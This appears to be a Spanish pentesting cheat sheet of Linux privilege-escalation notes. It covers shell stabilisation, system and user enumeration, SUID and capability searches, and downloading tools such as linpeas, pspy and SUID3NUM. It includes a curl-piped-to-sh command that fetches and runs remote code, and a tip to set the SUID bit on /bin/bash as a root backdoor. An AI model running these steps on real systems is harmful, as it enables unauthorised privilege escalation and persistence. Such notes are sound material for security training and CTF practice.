# Sanitización de Shell

```
script /dev/null -c bash
## CTRL+Z
reset xterm
export TERM=xterm
export SHELL=bash
source /etc/skel/.bashrc
``` 

### [[penelope]]

# Reconocimiento
## Información del sistema y kernel
```bash
uname -a ## Información disponible acerca del sistema y el kernel

cat /etc/issue ## Identificador de la distribución del sistema operativo

cat /proc/version ## Información detallada de la versión del kernel de Linux

sudo -V | grep "Sudo ver" | grep "1\.[01234567]\.[0-9]\+\|1\.8\.1[0-9]\*\|1\.8\.2[01234567]" ## Comprueba si la versión de `sudo` es vulnerable.
```


## Información de la red

```shell
ipconfig ## Muestra la configuración de red

ip a ## Muestra información detallada de todas las interfaces de red

netstat -tulpn ## Muestra sockets de escucha (`-l`) TCP/UDP (`-t`/`-u`), con números en lugar de nombres (`-n`) y el proceso/programa que los usa (`-p`). Requiere permisos de root para ver todos los procesos

arp -a ## Muestra la tabla ARP (Protocolo de resolución de direcciones) del sistema, que mapea direcciones IP a direcciones MAC en la red local.

ss -nltp ## Info sobre puertos abiertos
```


## Usuarios y grupos

```shell
cat /etc/passwd ## Muestra el archivo de base de datos de usuarios del sistem

cat /etc/group ## Muestra el archivo de base de datos de grupos del sistema

whoami ## Usuario actual

id ## IDs del usuario actual (UID, GID y grupos)

sudo -l ## Comandos ejecutables con privilegios
```


## Procesos en ejecución

```shell
ps aux ## Muestra una instantánea de todos los procesos

ps -ef ## Muestra una lista completa de todos los procesos en formato estilo BSD

top ## Muestra una vista dinámica en tiempo real de los procesos del sistema
```


## Servicios y cron jobs

```shell
systemctl list-timers ## Lista todos los temporizadores del systemd

crontab -l ## Lista cronjobs (tareas programadas) del user actual

ls -la /etc/cron* ## Lista /etc/cron (cronjobs)

cat /etc/crontab ## Archivo de config principal de cron (jobs globales)
```


## Archivos con permisos SUID/SGID

```shell
find / -perm -u=s -type f 2>/dev/null
## Busca archivos con el bit SUID (Set User ID)

find / -perm -g=s -type f 2>/dev/null
## Busca archivos con el bit SGID (Set Group ID)
```


## Enumerar capabilities

```bash
getcap -r / 2>/dev/null
## Capabilities

cat /dir/dir/file | grep Cap
## Capabilites de un archivo concreto

grep Cap /proc/$PID/status
## Capabilites de un proceso por PID
 ```


## Archivos editables por el usuario actual
```shell
find / -writable -type d 2>/dev/null
## Dirs editables

find / -type f -writable 2>/dev/null 2>/dev/null
## Archivos editables
```


# Variables de entorno
```
env 
```


# Scripts
### Suid3num
```bash
wget https://raw.githubusercontent.com/Anon-Exploiter/SUID3NUM/master/suid3num.py | chmod +x suid3num.py
```
### pspy64
```bash
wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.1/pspy64 && chmod +x pspy64 && ./pspy64
```
### Linpeas
```bash
curl -L https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh | sh
```
 

# Protips

```bash
chmod u+s /bin/bash
```
Este código añade el bit SUID al binario bash, después solo es necesario esperar a que se ejecute y lanzar un `bash -p` 

```bash
mysql -u USERNAME -pPASSWORD -h HOSTNAMEORIP DATABASENAME 
```
MySQL oneliner DB connection